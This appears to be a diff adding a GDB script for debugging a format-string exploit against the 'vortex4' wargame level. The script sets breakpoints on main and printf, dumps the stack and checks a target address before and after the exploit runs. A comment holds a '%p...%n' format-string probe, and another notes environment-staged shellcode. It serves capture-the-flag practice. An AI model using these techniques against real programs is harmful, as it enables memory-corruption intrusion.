@@ -1,0 +1,65 @@
+set follow-fork-mode child
+set logging file /tmp/gdb.log
+set logging overwrite on
+set logging redirect on
+# set logging on
+
+
+# start like this:
+# env -i gdb -x gdb.script vortex4-c-wrapper
+
+unset env COLUMNS
+unset env LINES
+
+
+break main
+# r %p%p%p%p%p%p%p%p%p%pA%n DDDD program
+r `cat ./format-string` `cat ./format-string-payload` ./vortex4
+
+c
+
+# 0 -> 0x160804a0
+# 1 -> 0x04a01408
+# 2 -> 
+
+
+shell sleep 0.5
+#shell echo "PRINT ENV"
+#env
+#shell echo "PRINT ARGV"
+#argv
+#x/10wx$esp
+
+b *printf 
+c
+shell sleep 0.5
+
+shell echo "PRINT STACKFRAME"
+x/510wx $esp
+
+set $hit = (int)($esp+4+486-4)
+shell echo "Hitting at this adr BEFORE EXPLOIT"
+x/1wx(int)($hit)
+
+shell echo "Value behind hit adr BEFORE EXPLOIT"
+x/1wx 0x804a014
+
+
+
+shell sleep 0.5
+finish
+shell sleep 0.5
+
+shell echo "Value behind hit adr AFTER EXPLOIT"
+x/1wx 0x804a014
+
+# now we are after finish
+# delete breakpoint in main
+del 
+
+shell sleep 0.5
+c
+
+
+# 1c:0070│  0xffffdeb8 —▸ 0xffffdf98 ◂— 'FORMATSTRINGPAYLOAD'
+# 1d:0074│  0xffffdebc —▸ 0xffffdfac ◂— 'ENVPAYLOADSHELLCODE'
